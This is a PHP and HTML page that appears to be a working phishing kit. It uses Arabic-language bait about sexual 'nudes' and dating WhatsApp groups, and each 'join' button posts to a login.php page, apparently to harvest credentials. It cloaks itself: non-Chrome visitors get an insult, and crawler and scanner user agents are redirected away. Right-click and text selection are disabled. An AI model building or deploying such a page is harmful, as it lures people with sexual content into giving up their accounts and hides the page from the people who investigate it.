<?php
if ($_SERVER["HTTP_ACCEPT"] and preg_match("/(.*?)Chrome(.*?)/",$_SERVER["HTTP_USER_AGENT"])){
} else {
echo" كسمك يصحبي 😂"; 
return false; 
}
?> 
<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">

<img class="icon" src="img/icon.png">
<center>
<div class="divider">
<span>💋💞جروبات نودز وتعارف شباب وبنات  اضغط دخول للانضمام الينا💞💋 </span>
</div>
<div class="notify">
دخول
</div>

<div class="scroll">
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://chat.whatsapp.com/JmGoIDD9qjLCM6pABxG7pz" readonly>
<button type="submit">انضمام</button>
</form>
<img src="img/1.png">
<div class="nama-grup">ساره لنودز والتعارف</div>
<div class="deskripsi-grup">انضم الان لمعرفة المزيد</div>
</div>
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://chat.whatsapp.com/JmGoIDD9qjLCM6pABxG7pz" readonly>
<button type="submit">انضمام</button>
</form>
<img src="img/2.png">
<div class="nama-grup">حنان تعملك جنان</div>
<div class="deskripsi-grup">انضم الان لمعرفة المزيد</div>
</div>
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://chat.whatsapp.com/JmGoIDD9qjLCM6pABxG7pz" readonly>
<button type="submit">انضمام</button>
</form>
<img src="img/3.png">
<div class="nama-grup">نرمين للتعارف الجاد</div>
<div class="deskripsi-grup">انضم الان لمعرفة المزيد</div>
</div>
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://chat.whatsapp.com/JmGoIDD9qjLCM6pABxG7pz" readonly>
<button type="submit">انضمام</button>
</form>
<img src="img/4.png">
<div class="nama-grup">زيزي لنيك الجاد</div>
<div class="deskripsi-grup">انضم الان لمعرفة المزيد</div>
</div>
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://chat.whatsapp.com/JmGoIDD9qjLCM6pABxG7pz" readonly>
<button type="submit">انضمام</button>
</form>
<img src="img/5.png">
<div class="nama-grup">خلود لدلع الرجال</div>
<div class="deskripsi-grup">انضم الان لمعرفة المزيد</div>
</div>
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://chat.whatsapp.com/JmGoIDD9qjLCM6pABxG7pz" readonly>
<button type="submit">انضمام</button>
</form>
<img src="img/6.png">
<div class="nama-grup">منال للمشي الشمال</div>
<div class="deskripsi-grup">انضم الان لمعرفة المزيد</div>
</div>
</div>
</center>

<div class="line"></div>


</div> <!--- container --->


</body>
</html>